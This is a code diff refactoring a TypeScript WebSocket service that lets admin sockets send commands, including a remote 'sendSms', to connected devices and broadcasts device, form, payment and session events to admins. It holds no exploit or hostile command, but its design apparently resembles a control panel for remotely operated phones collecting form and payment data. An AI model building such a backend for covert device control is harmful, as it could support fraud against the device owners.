@@ -20,12 +20,12 @@ class WsService {
   // - "<deviceId>" for per-device admin connections (connected to /ws/admin/:deviceId)
   private adminConnections: Map<string, Set<WebSocket>> = new Map();
 
-  // ✅ Track "primary/latest" device socket to avoid broadcast duplicates
+  // track "primary/latest" device socket to avoid duplicate sends
   private primaryDeviceSocket: Map<string, WebSocket> = new Map();
   private socketConnectedAt: WeakMap<WebSocket, number> = new WeakMap();
 
-  // ✅ Dedupe sendSms by clientMsgId (TTL)
-  private sendSmsDedupe: Map<string, number> = new Map(); // clientMsgId -> expiresAt
+  // dedupe sendSms by clientMsgId (TTL)
+  private sendSmsDedupe: Map<string, number> = new Map();
 
   init(server: http.Server, wsBasePath = config.wsPath) {
     if (this.wss) {
@@ -45,7 +45,6 @@ class WsService {
 
         const prefix = wsBasePath.endsWith("/") ? wsBasePath.slice(0, -1) : wsBasePath;
 
-        // support both device and admin sockets
         const isDeviceSocket = pathname.startsWith(`${prefix}/devices/`);
         const isAdminSocket = pathname.startsWith(`${prefix}/admin`);
 
@@ -54,20 +53,12 @@ class WsService {
           return;
         }
 
-        // determine id: admin sockets get either global key "__ADMIN__"
-        // or a per-device id (the target deviceId). Device sockets use the last path segment.
         let deviceId = "";
         if (isAdminSocket) {
-          // support both /ws/admin and /ws/admin/<deviceId>
           const parts = pathname.split("/").filter(Boolean);
           const adminIndex = parts.findIndex((p) => p === "admin");
           const maybeTarget = adminIndex >= 0 && parts.length > adminIndex + 1 ? parts[adminIndex + 1] : null;
-
-          if (maybeTarget) {
-            deviceId = String(maybeTarget);
-          } else {
-            deviceId = "__ADMIN__";
-          }
+          deviceId = maybeTarget ? String(maybeTarget) : "__ADMIN__";
         } else {
           const parts = pathname.split("/");
           deviceId = parts[parts.length - 1];
@@ -87,7 +78,9 @@ class WsService {
         logger.error("wsService upgrade error", err);
         try {
           socket.destroy();
-        } catch {}
+        } catch {
+          // ignore
+        }
       }
     });
 
@@ -109,7 +102,9 @@ class WsService {
         logger.error("wsService connection handler error", err);
         try {
           ws.close();
-        } catch {}
+        } catch {
+          // ignore
+        }
       }
     });
 
@@ -118,7 +113,6 @@ class WsService {
 
   private cleanupSendSmsDedupe() {
     const now = Date.now();
-    // keep it tiny (bounded by recent sends)
     for (const [k, exp] of this.sendSmsDedupe.entries()) {
       if (exp <= now) this.sendSmsDedupe.delete(k);
     }
@@ -132,21 +126,18 @@ class WsService {
     const exp = this.sendSmsDedupe.get(clientMsgId);
     if (exp && exp > now) return true;
 
-    this.sendSmsDedupe.set(clientMsgId, now + 60_000); // 60s TTL
+    this.sendSmsDedupe.set(clientMsgId, now + 60_000);
     return false;
   }
 
-  // registerClient: track sockets and (optionally) mark device online only for real devices
   private async registerClient(deviceId: string, ws: WebSocket) {
     const set = this.clients.get(deviceId) || new Set<WebSocket>();
     set.add(ws);
     this.clients.set(deviceId, set);
 
-    // ✅ mark socket connect time + make it primary (latest wins)
     this.socketConnectedAt.set(ws, Date.now());
     this.primaryDeviceSocket.set(deviceId, ws);
 
-    // Mark ONLINE only for non-admin device ids
     if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
       try {
         await Device.findOneAndUpdate(
@@ -157,7 +148,7 @@ class WsService {
               "status.timestamp": Date.now(),
             },
           },
-          { upsert: true }
+          { upsert: true },
         );
 
         logger.info("Device marked ONLINE (ws connect)", { deviceId });
@@ -175,20 +166,18 @@ class WsService {
     set.add(ws);
     this.adminConnections.set(key, set);
 
-    logger.info("Admin connected", { key, total: (set && set.size) || 0 });
+    logger.info("Admin connected", { key, total: set.size });
 
     ws.once("close", () => this.unregisterAdminClient(key, ws));
     ws.once("error", () => this.unregisterAdminClient(key, ws));
   }
 
-  // DISCONNECT = OFFLINE (INSTANT) for device sockets
   private async unregisterClient(deviceId: string, ws: WebSocket) {
     const set = this.clients.get(deviceId);
     if (!set) return;
 
     set.delete(ws);
 
-    // ✅ if this ws was primary, choose another newest remaining as primary
     if (this.primaryDeviceSocket.get(deviceId) === ws) {
       if (set.size > 0) {
         let best: WebSocket | null = null;
@@ -206,7 +195,6 @@ class WsService {
       }
     }
 
-    // if others remain, keep status
     if (set.size > 0) {
       logger.info("wsService: device socket removed but other connections exist", {
         deviceId,
@@ -215,10 +203,8 @@ class WsService {
       return;
     }
 
-    // fully disconnected
     this.clients.delete(deviceId);
 
-    // Only mark offline for real devices (don't mark admin channels)
     if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
       try {
         await Device.findOneAndUpdate(
@@ -228,17 +214,16 @@ class WsService {
               "status.online": false,
               "status.timestamp": Date.now(),
             },
-          }
+          },
         );
 
-        logger.info("🔥 Device marked OFFLINE (instant ws disconnect)", {
+        logger.info("Device marked OFFLINE (instant ws disconnect)", {
           deviceId,
         });
       } catch (e) {
         logger.error("Failed marking offline", e);
       }
 
-      // broadcast offline to admins
       this.notifyDeviceStatus(deviceId, {
         online: false,
         timestamp: Date.now(),
@@ -275,13 +260,11 @@ class WsService {
         const obj: WsPayload = JSON.parse(text);
         const type = obj.type;
 
-        // PING
         if (type === "ping") {
           ws.send(JSON.stringify({ type: "ack", timestamp: Date.now() }));
           return;
         }
 
-        // STATUS UPDATE (HEARTBEAT BASED)
         if (type === "status" && socketType === "device") {
           const online = !!obj.online;
           const ts = Number(obj.timestamp || Date.now());
@@ -294,7 +277,7 @@ class WsService {
                 "status.timestamp": ts,
               },
             },
-            { upsert: true }
+            { upsert: true },
           );
 
           logger.info("wsService: status updated", {
@@ -310,14 +293,14 @@ class WsService {
           return;
         }
 
-        // CMD FORWARD
         if (type === "cmd") {
           let adminTargetFromUrl: string | null = null;
           if (socketType === "admin" && deviceId !== "__ADMIN__") {
             adminTargetFromUrl = deviceId;
           }
 
-          const targetDeviceId = obj.payload?.uniqueid || obj.payload?.deviceId || adminTargetFromUrl || deviceId;
+          const targetDeviceId =
+            obj.payload?.uniqueid || obj.payload?.deviceId || adminTargetFromUrl || deviceId;
 
           const forwarded = this.sendCommandToDevice(targetDeviceId, obj.name || "", obj.payload || {});
 
@@ -342,7 +325,6 @@ class WsService {
       });
     });
 
-    // ACK back to the socket (for both device and admin)
     const ackPayload = {
       type: "ack",
       message: socketType === "device" ? "device connected" : "admin connected",
@@ -364,7 +346,6 @@ class WsService {
     }
   }
 
-  // Broadcast to all device sockets (keep for events/status; OK to broadcast)
   sendToDevice(deviceId: string, payload: WsPayload) {
     const set = this.clients.get(deviceId);
     if (!set || set.size === 0) return false;
@@ -375,7 +356,6 @@ class WsService {
     return true;
   }
 
-  // ✅ Send to ONE device socket (primary)
   private sendToDevicePrimary(deviceId: string, payload: WsPayload) {
     const ws = this.primaryDeviceSocket.get(deviceId);
     if (!ws) return false;
@@ -389,7 +369,6 @@ class WsService {
     const normalized =
       typeof deviceId === "string" && deviceId.startsWith("__ADMIN__:") ? deviceId.split(":", 2)[1] : deviceId;
 
-    // ✅ Special-case sendSms: single socket + dedupe by clientMsgId
     if (name === "sendSms") {
       const clientMsgId = String(payload?.clientMsgId || "").trim();
       if (clientMsgId && this.isDuplicateSendSms(clientMsgId)) {
@@ -397,7 +376,7 @@ class WsService {
           deviceId: normalized,
           clientMsgId,
         });
-        return true; // treat as delivered to stop UI retries
+        return true;
       }
 
       const delivered = this.sendToDevicePrimary(normalized, {
@@ -415,15 +394,12 @@ class WsService {
       return delivered;
     }
 
-    // default commands: keep broadcast (some commands may expect all sockets)
     return this.sendToDevice(normalized, {
       type: "cmd",
       name,
       payload,
     });
   }
-
-  // ---- Admin helpers ----
 
   private sendToAdminKey(key: string, payload: WsPayload) {
     const set = this.adminConnections.get(key);
@@ -432,6 +408,16 @@ class WsService {
     const text = JSON.stringify(payload);
     for (const ws of set) this.sendRaw(ws, text);
     return true;
+  }
+
+  private sendToAdminKeys(keys: string[], payload: WsPayload) {
+    let sent = false;
+    for (const key of keys) {
+      if (!key) continue;
+      const ok = this.sendToAdminKey(key, payload);
+      if (ok) sent = true;
+    }
+    return sent;
   }
 
   async sendToAdminDevice(deviceId: string, payload: WsPayload) {
@@ -452,12 +438,205 @@ class WsService {
       },
     };
 
-    const sentGlobal = this.sendToAdminKey("__ADMIN__", payload);
-    const sentLegacy = this.sendToAdminKey("admin", payload);
+    const sent = this.sendToAdminKeys(["__ADMIN__", "admin"], payload);
 
-    logger.info("wsService: global admin update broadcasted", { phone, sentGlobal, sentLegacy });
+    logger.info("wsService: global admin update broadcasted", { phone, sent });
 
-    return !!(sentGlobal || sentLegacy);
+    return sent;
+  }
+
+  broadcastAdminEvent(
+    event: string,
+    data: WsPayload = {},
+    options: {
+      deviceId?: string;
+      includeDeviceChannel?: boolean;
+      includeDeviceSockets?: boolean;
+    } = {},
+  ) {
+    const payload = {
+      type: "event",
+      event,
+      deviceId: options.deviceId || data.deviceId || undefined,
+      data,
+      timestamp: Date.now(),
+    };
+
+    const keys = ["__ADMIN__", "admin"];
+    if (options.includeDeviceChannel !== false && options.deviceId) {
+      keys.push(options.deviceId);
+    }
+
+    const sentAdmins = this.sendToAdminKeys(keys, payload);
+    const sentDevices =
+      options.includeDeviceSockets === true && options.deviceId
+        ? this.sendToDevice(options.deviceId, payload)
+        : false;
+
+    logger.info("wsService: broadcastAdminEvent", {
+      event,
+      deviceId: options.deviceId || null,
+      sentAdmins,
+      sentDevices,
+    });
+
+    return sentAdmins || sentDevices;
+  }
+
+  broadcastDeviceUpsert(device: any) {
+    const deviceId = String(device?.deviceId || "").trim();
+    if (!deviceId) return false;
+
+    return this.broadcastAdminEvent("device:upsert", device, {
+      deviceId,
+      includeDeviceChannel: true,
+      includeDeviceSockets: false,
+    });
+  }
+
+  broadcastDeviceDelete(deviceId: string) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent(
+      "device:delete",
+      { deviceId: cleanId },
+      {
+        deviceId: cleanId,
+        includeDeviceChannel: true,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastFavoriteUpdate(deviceId: string, favorite: boolean) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent(
+      "favorite:update",
+      { deviceId: cleanId, favorite: favorite === true },
+      {
+        deviceId: cleanId,
+        includeDeviceChannel: true,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastFormNew(deviceId: string, form: WsPayload) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent("form:new", form, {
+      deviceId: cleanId,
+      includeDeviceChannel: true,
+      includeDeviceSockets: false,
+    });
+  }
+
+  broadcastFormUpdate(deviceId: string, patch: WsPayload) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent("form:update", patch, {
+      deviceId: cleanId,
+      includeDeviceChannel: true,
+      includeDeviceSockets: false,
+    });
+  }
+
+  broadcastPaymentNew(deviceId: string, method: string, payloadData: WsPayload) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent(
+      "payment:new",
+      {
+        deviceId: cleanId,
+        method,
+        payload: payloadData,
+        createdAt: Date.now(),
+      },
+      {
+        deviceId: cleanId,
+        includeDeviceChannel: true,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastSessionUpsert(session: WsPayload) {
+    const deviceId = String(session?.deviceId || "").trim();
+
+    return this.broadcastAdminEvent("session:upsert", session, {
+      deviceId: deviceId || undefined,
+      includeDeviceChannel: true,
+      includeDeviceSockets: false,
+    });
+  }
+
+  broadcastSessionDelete(deviceId: string, admin?: string) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent(
+      "session:delete",
+      { deviceId: cleanId, admin: admin || "" },
+      {
+        deviceId: cleanId,
+        includeDeviceChannel: true,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastSessionClear() {
+    return this.broadcastAdminEvent(
+      "session:clear",
+      {},
+      {
+        includeDeviceChannel: false,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastNotificationClearDevice(deviceId: string) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent(
+      "notification:clearDevice",
+      { deviceId: cleanId },
+      {
+        deviceId: cleanId,
+        includeDeviceChannel: true,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastNotificationClearAll() {
+    return this.broadcastAdminEvent(
+      "notification:clearAll",
+      {},
+      {
+        includeDeviceChannel: false,
+        includeDeviceSockets: false,
+      },
+    );
+  }
+
+  broadcastCrashCreated(deviceId: string, data: WsPayload) {
+    const cleanId = String(deviceId || "").trim();
+    if (!cleanId) return false;
+
+    return this.broadcastAdminEvent("crash:new", data, {
+      deviceId: cleanId,
+      includeDeviceChannel: true,
+      includeDeviceSockets: false,
+    });
   }
 
   notifyDeviceStatus(deviceId: string, status: { online: boolean; timestamp?: number }) {
@@ -466,15 +645,11 @@ class WsService {
       event: "status",
       deviceId,
       data: status,
+      timestamp: Date.now(),
     };
 
-    // send to device sockets (if any)
     this.sendToDevice(deviceId, payload);
-
-    // admin channels
-    this.sendToAdminKey("__ADMIN__", payload);
-    this.sendToAdminKey("admin", payload);
-    this.sendToAdminKey(deviceId, payload);
+    this.sendToAdminKeys(["__ADMIN__", "admin", deviceId], payload);
 
     return true;
   }
@@ -484,7 +659,9 @@ class WsService {
       for (const ws of set) {
         try {
           ws.close();
-        } catch {}
+        } catch {
+          // ignore
+        }
       }
     }
     this.clients.clear();
@@ -494,7 +671,9 @@ class WsService {
       for (const ws of set) {
         try {
           ws.close();
-        } catch {}
+        } catch {
+          // ignore
+        }
       }
     }
     this.adminConnections.clear();
@@ -502,7 +681,9 @@ class WsService {
     if (this.wss) {
       try {
         this.wss.close();
-      } catch {}
+      } catch {
+        // ignore
+      }
       this.wss = null;
     }
 
